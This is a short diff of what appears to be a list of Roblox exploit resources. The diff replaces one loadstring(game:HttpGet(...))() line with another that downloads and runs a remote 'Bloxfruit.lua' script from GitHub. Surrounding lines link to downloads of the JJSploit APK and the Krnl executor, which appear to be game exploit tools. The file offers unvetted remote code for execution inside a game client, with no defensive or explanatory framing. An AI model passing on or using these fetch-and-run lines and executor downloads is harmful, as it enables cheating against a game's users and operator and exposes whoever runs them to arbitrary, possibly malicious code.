@@ -8,6 +8,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroX0368/Script/refs
 
 https://wrdcdn.net/r/103473/1769404797647/JJSploit-arm64vng.apk
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/meobeo8/a/a/a"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZeroX0368/Script/refs/heads/main/Bloxfruit.lua"))()
 
 https://wearedevs.net/d/Krnl
